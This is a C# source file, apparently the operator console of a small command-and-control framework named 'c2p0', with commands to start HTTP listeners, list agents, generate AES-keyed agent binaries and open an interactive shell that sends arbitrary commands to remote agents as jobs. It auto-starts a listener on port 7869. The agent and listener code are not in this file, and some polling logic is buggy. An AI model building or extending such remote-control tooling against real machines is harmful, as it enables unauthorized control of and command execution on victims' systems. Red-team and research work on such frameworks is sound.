//using Newtonsoft.Json;
using System.Diagnostics;
using System;
using Microsoft.Extensions.DependencyInjection;
using c2p0.Lib.Interfaces;
using c2p0.Web;
using c2p0.Web.Lib;
using c2p0.Lib.Models;
using c2p0.Lib;
using System.Security.Cryptography;

namespace c2p0.Console
{
    public class Program
    {
        public static void PrintHelp()
        {
            System.Console.WriteLine("ll - List Listeners");
            System.Console.WriteLine("nhl <name> <port> - Start HTTP Listener");
            System.Console.WriteLine("la - List Agents");
            System.Console.WriteLine("lj <agent> - List Jobs for Agent");
            System.Console.WriteLine("ca <agent> - Enter shell for agent");
            System.Console.WriteLine("create-agent <listener>");
        }

        public static void ListListeners(IListenerManager lm)
        {
            System.Console.WriteLine("Listeners");
            System.Console.WriteLine("-------------------------------------");
            var listeners = lm.GetListeners();

            foreach (var listener in listeners)
            {
                System.Console.WriteLine("{0}", listener.ListenerGuid);
            }
        }

        public static void ListAgents(IAgentManager am)
        {
            System.Console.WriteLine("Agent                                             Listener                       ");
            System.Console.WriteLine("---------------------------------------------------------------------------------");
            var agents = am.GetAgents();

            foreach (var agent in agents)
            {
                System.Console.WriteLine("{0}              {1}", agent.AgentGuid, agent.ListenerGuid);
            }
        }

        public static void ListJobs(IJobManager jm){
            System.Console.WriteLine("Jobs");
            System.Console.WriteLine("-------------------------");

            var jobs = jm.GetJobs();

            foreach (var job in jobs){
                System.Console.WriteLine(job.Command, job.Response);
            }

        }

        public static void CreateListener(IListenerManager lm, IAgentManager am, IJobManager jm, string name, int port)
        {
            byte[] key, iv;
            using (Aes aesAlg = Aes.Create())
            {
                key = aesAlg.Key;
                iv = aesAlg.IV;
            }

            DemoListener dl = new DemoListener();
            dl.Init(name, port, am, jm, Convert.ToBase64String(key), iv);

            lm.AddListener(dl);

            dl.Start();
        }

        public static void EnterAgentShell(IListenerManager lm, IAgentManager am, IJobManager jm, string agentGuid)
        {
            var agent = am.GetAgentById(agentGuid);

            bool inShell = true;

            while (inShell)
            {
                bool awaitingCompletion = true;
                System.Console.ForegroundColor = ConsoleColor.DarkRed;
                System.Console.Write("{0}>$ ", agent.AgentGuid);
                System.Console.ResetColor();

                System.Console.ForegroundColor = ConsoleColor.DarkYellow;
                string command = System.Console.ReadLine();
                System.Console.ResetColor();
                var job = jm.CreateJob(agent.AgentGuid, command);
                while (awaitingCompletion)
                {
                    var tj = jm.GetJobByGuid(job.JobGuid);
                    if (job.Completed)
                    {
                        awaitingCompletion = false;
                        System.Console.WriteLine(job.Response);
                    }
                }
            }
        }

        public async static void CreateAgent(IListenerManager lm, IAgentManager am, IJobManager jm, string[] commandTokens)
        {
            Lib.Interfaces.Generator g = new Generator();
            var listener = lm.GetListener(commandTokens[1]);
            string outpath = await g.Compile(Convert.FromBase64String(listener.Key), listener.Iv);

            System.Console.WriteLine($"Agent has been generated at {outpath}");
        }

        public static void HandleCommand(IListenerManager lm, IAgentManager am, IJobManager jm, string command)
        {
            var commandTokens = command.Split(" ");
            string commandType = commandTokens[0];
            switch (commandType)
            {
                case "help":
                    PrintHelp();
                    break;
                case "ll":
                    ListListeners(lm);
                    break;
                case "nhl":
                    CreateListener(lm, am, jm, commandTokens[1], int.Parse(commandTokens[2]));
                    break;
                case "la":
                    ListAgents(am);
                    break;
                case "lj":
                    ListJobs(jm);
                    break;
                case "ca":
                    EnterAgentShell(lm, am, jm, commandTokens[1]);
                    break;
                case "create-agent":
                    CreateAgent(lm, am, jm, commandTokens);
                    break;
            }
        }

        static async Task Main(string[] args)
        {
            // Providers
            var serviceProvider = new ServiceCollection()
                .AddSingleton<IListenerManager, ListenerManager>()
                .AddSingleton<IAgentManager, AgentManager>()
                .AddSingleton<IJobManager, JobManager>()
                .BuildServiceProvider();

            var listenerManager = serviceProvider.GetService<IListenerManager>();
            var agentManager = serviceProvider.GetService<IAgentManager>();
            var jobManager = serviceProvider.GetService<IJobManager>();

            System.Console.ForegroundColor = ConsoleColor.DarkRed;
            System.Console.WriteLine(" ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄  ");
            System.Console.WriteLine("▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌ ▐░░░░░░░░░▌ ");
            System.Console.WriteLine("▐░█▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█░█▀▀▀▀▀█░▌");
            System.Console.WriteLine("▐░▌                    ▐░▌▐░▌       ▐░▌▐░▌▐░▌    ▐░▌");
            System.Console.WriteLine("▐░▌                    ▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌ ▐░▌   ▐░▌");
            System.Console.WriteLine("▐░▌           ▄▄▄▄▄▄▄▄▄█░▌▐░░░░░░░░░░░▌▐░▌  ▐░▌  ▐░▌");
            System.Console.WriteLine("▐░▌          ▐░░░░░░░░░░░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌   ▐░▌ ▐░▌");
            System.Console.WriteLine("▐░▌          ▐░█▀▀▀▀▀▀▀▀▀ ▐░▌          ▐░▌    ▐░▌▐░▌");
            System.Console.WriteLine("▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌          ▐░█▄▄▄▄▄█░█░▌");
            System.Console.WriteLine("▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌           ▐░░░░░░░░░▌ ");
            System.Console.WriteLine(" ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀             ▀▀▀▀▀▀▀▀▀  ");
            System.Console.WriteLine("____________________________________________________________________________");
            System.Console.WriteLine("____________________________________________________________________________");
            System.Console.WriteLine("____________________________________________________________________________");
            System.Console.WriteLine("____________At_your_service_________________________________________________");
            System.Console.WriteLine("____________________________________________________________________________");
            System.Console.WriteLine("____________________________________________________________________________");
            System.Console.ResetColor();

            HandleCommand(listenerManager, agentManager, jobManager, "nhl test 7869");

            while (true)
            {
                var test = System.Console.IsInputRedirected;
                var test2 = System.Console.IsOutputRedirected;
                var test3 = System.Console.IsErrorRedirected;
                System.Console.OpenStandardInput();
                System.Console.OpenStandardOutput();
                System.Console.OpenStandardError();
                System.Console.Write("c2p0>$ ");
                string command = System.Console.ReadLine();

                HandleCommand(listenerManager, agentManager, jobManager, command);
            }


        }
    }
}